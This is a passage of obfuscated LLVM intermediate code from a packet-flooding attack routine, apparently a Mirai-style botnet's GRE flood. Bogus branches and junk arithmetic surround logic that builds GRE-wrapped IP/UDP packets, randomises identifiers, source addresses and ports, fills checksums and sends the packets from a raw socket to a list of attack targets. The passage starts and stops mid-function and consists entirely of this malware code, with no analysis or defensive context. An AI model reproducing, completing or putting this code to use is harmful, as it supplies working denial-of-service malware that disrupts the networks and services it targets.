  store i32 %398, i32* %400, align 4
  %401 = load i32, i32* @x.19
  %402 = load i32, i32* @y.20
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart275, label %originalBB55alteredBB

originalBBpart275:                                ; preds = %originalBB55
  br label %409

; <label>:409:                                    ; preds = %originalBBpart275, %344
  %410 = load i32, i32* %29, align 4
  %411 = icmp eq i32 %410, -1
  br i1 %411, label %412, label %432

; <label>:412:                                    ; preds = %409
  %413 = load i32, i32* @x.19
  %414 = load i32, i32* @y.20
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %412
  %421 = call i32 @rand_next()
  %422 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 8
  store i32 %421, i32* %423, align 4
  %424 = load i32, i32* @x.19
  %425 = load i32, i32* @y.20
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %432

; <label>:432:                                    ; preds = %originalBBpart279, %409
  %433 = load i32, i32* @x.19
  %434 = load i32, i32* @y.20
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %432
  %441 = load i16, i16* %21, align 2
  %442 = zext i16 %441 to i32
  %443 = icmp eq i32 %442, 65535
  %444 = load i32, i32* @x.19
  %445 = load i32, i32* @y.20
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %443, label %452, label %467

; <label>:452:                                    ; preds = %originalBBpart283
  %453 = call i32 @rand_next()
  %454 = and i32 %453, 65535
  %455 = trunc i32 %454 to i16
  %456 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 3
  store i16 %455, i16* %457, align 4
  %458 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 3
  %460 = load i16, i16* %459, align 4
  %461 = zext i16 %460 to i32
  %462 = sub nsw i32 %461, 1000
  %463 = xor i32 %462, -1
  %464 = trunc i32 %463 to i16
  %465 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 3
  store i16 %464, i16* %466, align 4
  br label %467

; <label>:467:                                    ; preds = %452, %originalBBpart283
  %468 = load i16, i16* %24, align 2
  %469 = zext i16 %468 to i32
  %470 = icmp eq i32 %469, 65535
  br i1 %470, label %471, label %493

; <label>:471:                                    ; preds = %467
  %472 = load i32, i32* @x.19
  %473 = load i32, i32* @y.20
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %471
  %480 = call i32 @rand_next()
  %481 = and i32 %480, 65535
  %482 = trunc i32 %481 to i16
  %483 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %484 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %483, i32 0, i32 0
  store i16 %482, i16* %484, align 2
  %485 = load i32, i32* @x.19
  %486 = load i32, i32* @y.20
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart288, label %originalBB85alteredBB

originalBBpart288:                                ; preds = %originalBB85
  br label %493

; <label>:493:                                    ; preds = %originalBBpart288, %467
  %494 = load i32, i32* @x.19
  %495 = load i32, i32* @y.20
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %493
  %502 = load i16, i16* %25, align 2
  %503 = zext i16 %502 to i32
  %504 = icmp eq i32 %503, 65535
  %505 = load i32, i32* @x.19
  %506 = load i32, i32* @y.20
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %504, label %513, label %519

; <label>:513:                                    ; preds = %originalBBpart292
  %514 = call i32 @rand_next()
  %515 = and i32 %514, 65535
  %516 = trunc i32 %515 to i16
  %517 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %518 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %517, i32 0, i32 1
  store i16 %516, i16* %518, align 2
  br label %519

; <label>:519:                                    ; preds = %513, %originalBBpart292
  %520 = load i8, i8* %28, align 1
  %521 = icmp ne i8 %520, 0
  br i1 %521, label %526, label %522

; <label>:522:                                    ; preds = %519
  %523 = call i32 @rand_next()
  %524 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 9
  store i32 %523, i32* %525, align 4
  br label %532

; <label>:526:                                    ; preds = %519
  %527 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 9
  %529 = load i32, i32* %528, align 4
  %530 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 9
  store i32 %529, i32* %531, align 4
  br label %532

; <label>:532:                                    ; preds = %526, %522
  %533 = load i32, i32* @x.19
  %534 = load i32, i32* @y.20
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %532
  %541 = load i8, i8* %27, align 1
  %542 = icmp ne i8 %541, 0
  %543 = load i32, i32* @x.19
  %544 = load i32, i32* @y.20
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %542, label %551, label %554

; <label>:551:                                    ; preds = %originalBBpart296
  %552 = load i8*, i8** %39, align 8
  %553 = load i32, i32* %26, align 4
  call void @rand_str(i8* %552, i32 %553)
  br label %554

; <label>:554:                                    ; preds = %551, %originalBBpart296
  %555 = load i32, i32* @x.19
  %556 = load i32, i32* @y.20
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %554
  %563 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %564 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %563, i32 0, i32 7
  store i16 0, i16* %564, align 2
  %565 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %566 = bitcast %struct.iphdr* %565 to i16*
  %567 = call zeroext i16 @checksum_generic(i16* %566, i32 20)
  %568 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %569 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %568, i32 0, i32 7
  store i16 %567, i16* %569, align 2
  %570 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %571 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %570, i32 0, i32 7
  store i16 0, i16* %571, align 2
  %572 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %573 = bitcast %struct.iphdr* %572 to i16*
  %574 = call zeroext i16 @checksum_generic(i16* %573, i32 20)
  %575 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 7
  store i16 %574, i16* %576, align 2
  %577 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %578 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %577, i32 0, i32 3
  store i16 0, i16* %578, align 2
  %579 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %580 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %581 = bitcast %struct.udphdr* %580 to i8*
  %582 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %583 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %582, i32 0, i32 2
  %584 = load i16, i16* %583, align 2
  %585 = load i32, i32* %26, align 4
  %586 = sext i32 %585 to i64
  %587 = add i64 8, %586
  %588 = trunc i64 %587 to i32
  %589 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %579, i8* %581, i16 zeroext %584, i32 %588)
  %590 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %591 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %590, i32 0, i32 3
  store i16 %589, i16* %591, align 2
  %592 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %593 = load i32, i32* %17, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %592, i64 %594
  %596 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %595, i32 0, i32 0
  %597 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %596, i32 0, i32 0
  store i16 2, i16* %597, align 4
  %598 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %599 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %598, i32 0, i32 9
  %600 = load i32, i32* %599, align 4
  %601 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %602 = load i32, i32* %17, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 2
  %607 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %606, i32 0, i32 0
  store i32 %600, i32* %607, align 4
  %608 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %609 = load i32, i32* %17, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i64 %610
  %612 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i32 0, i32 0
  %613 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %612, i32 0, i32 1
  store i16 0, i16* %613, align 2
  %614 = load i32, i32* %18, align 4
  %615 = load i8*, i8** %34, align 8
  %616 = load i32, i32* %26, align 4
  %617 = sext i32 %616 to i64
  %618 = add i64 52, %617
  %619 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %620 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %621 = load i32, i32* %17, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %620, i64 %622
  %624 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %623, i32 0, i32 0
  %625 = bitcast %struct.sockaddr_in* %624 to %struct.sockaddr*
  store %struct.sockaddr* %625, %struct.sockaddr** %619, align 8
  %626 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %627 = load %struct.sockaddr*, %struct.sockaddr** %626, align 8
  %628 = call i64 @sendto(i32 %614, i8* %615, i64 %618, i32 16384, %struct.sockaddr* %627, i32 16)
  %629 = load i32, i32* @x.19
  %630 = load i32, i32* @y.20
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBBpart2117, label %originalBB98alteredBB

originalBBpart2117:                               ; preds = %originalBB98
  br label %637

; <label>:637:                                    ; preds = %originalBBpart2117
  %638 = load i32, i32* @x.19
  %639 = load i32, i32* @y.20
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %637
  %646 = load i32, i32* %17, align 4
  %647 = add nsw i32 %646, 1
  store i32 %647, i32* %17, align 4
  %648 = load i32, i32* @x.19
  %649 = load i32, i32* @y.20
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBBpart2132, label %originalBB119alteredBB

originalBBpart2132:                               ; preds = %originalBB119
  br label %323

; <label>:656:                                    ; preds = %originalBBpart253
  br label %322

; <label>:657:                                    ; preds = %116, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %658 = alloca i8, align 1
  %659 = alloca %struct.attack_target*, align 8
  %660 = alloca i8, align 1
  %661 = alloca %struct.attack_option*, align 8
  %662 = alloca i32, align 4
  %663 = alloca i32, align 4
  %664 = alloca i8**, align 8
  %665 = alloca i8, align 1
  %666 = alloca i16, align 2
  %667 = alloca i8, align 1
  %668 = alloca i8, align 1
  %669 = alloca i16, align 2
  %670 = alloca i16, align 2
  %671 = alloca i32, align 4
  %672 = alloca i8, align 1
  %673 = alloca i8, align 1
  %674 = alloca i32, align 4
  %675 = alloca %struct.iphdr*, align 8
  %676 = alloca %struct.grehdr*, align 8
  %677 = alloca %struct.iphdr*, align 8
  %678 = alloca %struct.udphdr*, align 8
  %679 = alloca i8*, align 8
  %680 = alloca %struct.iphdr*, align 8
  %681 = alloca %struct.grehdr*, align 8
  %682 = alloca %struct.iphdr*, align 8
  %683 = alloca %struct.udphdr*, align 8
  %684 = alloca i8*, align 8
  %685 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %658, align 1
  store %struct.attack_target* %1, %struct.attack_target** %659, align 8
  store i8 %2, i8* %660, align 1
  store %struct.attack_option* %3, %struct.attack_option** %661, align 8
  %686 = load i8, i8* %658, align 1
  %687 = zext i8 %686 to i64
  %688 = call noalias i8* @calloc(i64 %687, i64 8) #6
  %689 = bitcast i8* %688 to i8**
  store i8** %689, i8*** %664, align 8
  %690 = load i8, i8* %660, align 1
  %691 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %692 = call i32 @attack_get_opt_int(i8 zeroext %690, %struct.attack_option* %691, i8 zeroext 2, i32 0)
  %693 = trunc i32 %692 to i8
  store i8 %693, i8* %665, align 1
  %694 = load i8, i8* %660, align 1
  %695 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %696 = call i32 @attack_get_opt_int(i8 zeroext %694, %struct.attack_option* %695, i8 zeroext 3, i32 65535)
  %697 = trunc i32 %696 to i16
  store i16 %697, i16* %666, align 2
  %698 = load i8, i8* %660, align 1
  %699 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %700 = call i32 @attack_get_opt_int(i8 zeroext %698, %struct.attack_option* %699, i8 zeroext 4, i32 64)
  %701 = trunc i32 %700 to i8
  store i8 %701, i8* %667, align 1
  %702 = load i8, i8* %660, align 1
  %703 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %704 = call i32 @attack_get_opt_int(i8 zeroext %702, %struct.attack_option* %703, i8 zeroext 5, i32 1)
  %705 = trunc i32 %704 to i8
  store i8 %705, i8* %668, align 1
  %706 = load i8, i8* %660, align 1
  %707 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %708 = call i32 @attack_get_opt_int(i8 zeroext %706, %struct.attack_option* %707, i8 zeroext 6, i32 65535)
  %709 = trunc i32 %708 to i16
  store i16 %709, i16* %669, align 2
  %710 = load i8, i8* %660, align 1
  %711 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %712 = call i32 @attack_get_opt_int(i8 zeroext %710, %struct.attack_option* %711, i8 zeroext 7, i32 65535)
  %713 = trunc i32 %712 to i16
  store i16 %713, i16* %670, align 2
  %714 = load i8, i8* %660, align 1
  %715 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %716 = call i32 @attack_get_opt_int(i8 zeroext %714, %struct.attack_option* %715, i8 zeroext 0, i32 512)
  store i32 %716, i32* %671, align 4
  %717 = load i8, i8* %660, align 1
  %718 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %719 = call i32 @attack_get_opt_int(i8 zeroext %717, %struct.attack_option* %718, i8 zeroext 1, i32 1)
  %720 = trunc i32 %719 to i8
  store i8 %720, i8* %672, align 1
  %721 = load i8, i8* %660, align 1
  %722 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %723 = call i32 @attack_get_opt_int(i8 zeroext %721, %struct.attack_option* %722, i8 zeroext 19, i32 0)
  %724 = trunc i32 %723 to i8
  store i8 %724, i8* %673, align 1
  %725 = load i8, i8* %660, align 1
  %726 = load %struct.attack_option*, %struct.attack_option** %661, align 8
  %727 = load i32, i32* @LOCAL_ADDR, align 4
  %728 = call i32 @attack_get_opt_int(i8 zeroext %725, %struct.attack_option* %726, i8 zeroext 25, i32 %727)
  store i32 %728, i32* %674, align 4
  %729 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %729, i32* %663, align 4
  %730 = icmp eq i32 %729, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %94
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %120
  %731 = load i32, i32* %17, align 4
  %732 = load i8, i8* %13, align 1
  %733 = zext i8 %732 to i32
  %734 = icmp slt i32 %731, %733
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %141
  %735 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %736 = load i8**, i8*** %19, align 8
  %737 = load i32, i32* %17, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds i8*, i8** %736, i64 %738
  store i8* %735, i8** %739, align 8
  %740 = load i8**, i8*** %19, align 8
  %741 = load i32, i32* %17, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds i8*, i8** %740, i64 %742
  %744 = load i8*, i8** %743, align 8
  %745 = bitcast i8* %744 to %struct.iphdr*
  store %struct.iphdr* %745, %struct.iphdr** %30, align 8
  %746 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %747 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %746, i64 1
  %748 = bitcast %struct.iphdr* %747 to %struct.grehdr*
  store %struct.grehdr* %748, %struct.grehdr** %31, align 8
  %749 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %750 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %749, i64 1
  %751 = bitcast %struct.grehdr* %750 to %struct.iphdr*
  store %struct.iphdr* %751, %struct.iphdr** %32, align 8
  %752 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %753 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %752, i64 1
  %754 = bitcast %struct.iphdr* %753 to %struct.udphdr*
  store %struct.udphdr* %754, %struct.udphdr** %33, align 8
  %755 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %756 = bitcast %struct.iphdr* %755 to i8*
  %757 = load i8, i8* %756, align 4
  %_ = shl i8 %757, 15
  %_11 = shl i8 %757, 15
  %_12 = sub i8 %757, 15
  %gen = mul i8 %_12, 15
  %758 = and i8 %757, 15
  %_13 = shl i8 %758, 64
  %_14 = sub i8 0, %758
  %gen15 = add i8 %_14, 64
  %_16 = sub i8 %758, 64
  %gen17 = mul i8 %_16, 64
  %_18 = shl i8 %758, 64
  %_19 = shl i8 %758, 64
  %_20 = sub i8 %758, 64
  %gen21 = mul i8 %_20, 64
  %_22 = shl i8 %758, 64
  %_23 = shl i8 %758, 64
  %_24 = sub i8 0, %758
  %gen25 = add i8 %_24, 64
  %759 = or i8 %758, 64
  store i8 %759, i8* %756, align 4
  %760 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %761 = bitcast %struct.iphdr* %760 to i8*
  %762 = load i8, i8* %761, align 4
  %_26 = shl i8 %762, -16
  %_27 = sub i8 0, %762
  %gen28 = add i8 %_27, -16
  %_29 = sub i8 %762, -16
  %gen30 = mul i8 %_29, -16
  %_31 = sub i8 0, %762
  %gen32 = add i8 %_31, -16
  %_33 = sub i8 0, %762
  %gen34 = add i8 %_33, -16
  %_35 = sub i8 %762, -16
  %gen36 = mul i8 %_35, -16
  %763 = and i8 %762, -16
  %_37 = shl i8 %763, 5
  %_38 = shl i8 %763, 5
  %764 = or i8 %763, 5
  store i8 %764, i8* %761, align 4
  %765 = load i8, i8* %20, align 1
  %766 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %767 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %766, i32 0, i32 1
  store i8 %765, i8* %767, align 1
  %768 = load i32, i32* %26, align 4
  %769 = sext i32 %768 to i64
  %_39 = sub i64 52, %769
  %gen40 = mul i64 %_39, %769
  %_41 = sub i64 52, %769
  %gen42 = mul i64 %_41, %769
  %_43 = shl i64 52, %769
  %770 = add i64 52, %769
  %771 = trunc i64 %770 to i16
  %772 = call zeroext i16 @htons(i16 zeroext %771) #7
  %773 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %774 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %773, i32 0, i32 2
  store i16 %772, i16* %774, align 2
  %775 = load i16, i16* %21, align 2
  %776 = call zeroext i16 @htons(i16 zeroext %775) #7
  %777 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %778 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %777, i32 0, i32 3
  store i16 %776, i16* %778, align 4
  %779 = load i8, i8* %22, align 1
  %780 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %781 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %780, i32 0, i32 5
  store i8 %779, i8* %781, align 4
  %782 = load i8, i8* %23, align 1
  %783 = icmp ne i8 %782, 0
  br label %originalBB10

originalBB47alteredBB:                            ; preds = %originalBB47, %260
  %784 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %785 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %786 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %785, i32 0, i32 4
  store i16 %784, i16* %786, align 2
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %323
  %787 = load i32, i32* %17, align 4
  %788 = load i8, i8* %13, align 1
  %789 = zext i8 %788 to i32
  %790 = icmp slt i32 %787, %789
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %372
  %791 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %792 = load i32, i32* %17, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %791, i64 %793
  %795 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %794, i32 0, i32 1
  %796 = load i32, i32* %795, align 4
  %797 = call i32 @ntohl(i32 %796) #7
  %798 = call i32 @rand_next()
  %799 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %800 = load i32, i32* %17, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %799, i64 %801
  %803 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %802, i32 0, i32 2
  %804 = load i8, i8* %803, align 4
  %805 = zext i8 %804 to i32
  %_56 = shl i32 %798, %805
  %_57 = sub i32 %798, %805
  %gen58 = mul i32 %_57, %805
  %_59 = sub i32 0, %798
  %gen60 = add i32 %_59, %805
  %806 = lshr i32 %798, %805
  %_61 = shl i32 %797, %806
  %_62 = sub i32 0, %797
  %gen63 = add i32 %_62, %806
  %_64 = sub i32 %797, %806
  %gen65 = mul i32 %_64, %806
  %_66 = sub i32 0, %797
  %gen67 = add i32 %_66, %806
  %_68 = sub i32 %797, %806
  %gen69 = mul i32 %_68, %806
  %_70 = sub i32 0, %797
  %gen71 = add i32 %_70, %806
  %_72 = sub i32 %797, %806
  %gen73 = mul i32 %_72, %806
  %807 = add i32 %797, %806
  %808 = call i32 @htonl(i32 %807) #7
  %809 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %810 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %809, i32 0, i32 9
  store i32 %808, i32* %810, align 4
  br label %originalBB55

originalBB77alteredBB:                            ; preds = %originalBB77, %412
  %811 = call i32 @rand_next()
  %812 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %813 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %812, i32 0, i32 8
  store i32 %811, i32* %813, align 4
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %432
  %814 = load i16, i16* %21, align 2
  %815 = zext i16 %814 to i32
  %816 = icmp eq i32 %815, 65535
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %471
  %817 = call i32 @rand_next()
  %_86 = shl i32 %817, 65535
  %818 = and i32 %817, 65535
  %819 = trunc i32 %818 to i16
  %820 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %821 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %820, i32 0, i32 0
  store i16 %819, i16* %821, align 2
  br label %originalBB85

originalBB90alteredBB:                            ; preds = %originalBB90, %493
  %822 = load i16, i16* %25, align 2
  %823 = zext i16 %822 to i32
  %824 = icmp eq i32 %823, 65535
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %532
  %825 = load i8, i8* %27, align 1
  %826 = icmp ne i8 %825, 0
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %554
  %827 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %828 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %827, i32 0, i32 7
  store i16 0, i16* %828, align 2
  %829 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %830 = bitcast %struct.iphdr* %829 to i16*
  %831 = call zeroext i16 @checksum_generic(i16* %830, i32 20)
  %832 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %833 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %832, i32 0, i32 7
  store i16 %831, i16* %833, align 2
  %834 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %835 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %834, i32 0, i32 7
  store i16 0, i16* %835, align 2
  %836 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %837 = bitcast %struct.iphdr* %836 to i16*
  %838 = call zeroext i16 @checksum_generic(i16* %837, i32 20)
  %839 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %840 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %839, i32 0, i32 7
  store i16 %838, i16* %840, align 2
  %841 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %842 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %841, i32 0, i32 3
  store i16 0, i16* %842, align 2
  %843 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %844 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %845 = bitcast %struct.udphdr* %844 to i8*
  %846 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %847 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %846, i32 0, i32 2
  %848 = load i16, i16* %847, align 2
  %849 = load i32, i32* %26, align 4
  %850 = sext i32 %849 to i64
  %_99 = sub i64 0, 8
  %gen100 = add i64 %_99, %850
  %_101 = sub i64 0, 8
  %gen102 = add i64 %_101, %850
  %_103 = sub i64 8, %850
  %gen104 = mul i64 %_103, %850
  %_105 = shl i64 8, %850
  %851 = add i64 8, %850
  %852 = trunc i64 %851 to i32
  %853 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %843, i8* %845, i16 zeroext %848, i32 %852)
  %854 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %855 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %854, i32 0, i32 3
  store i16 %853, i16* %855, align 2
  %856 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %857 = load i32, i32* %17, align 4
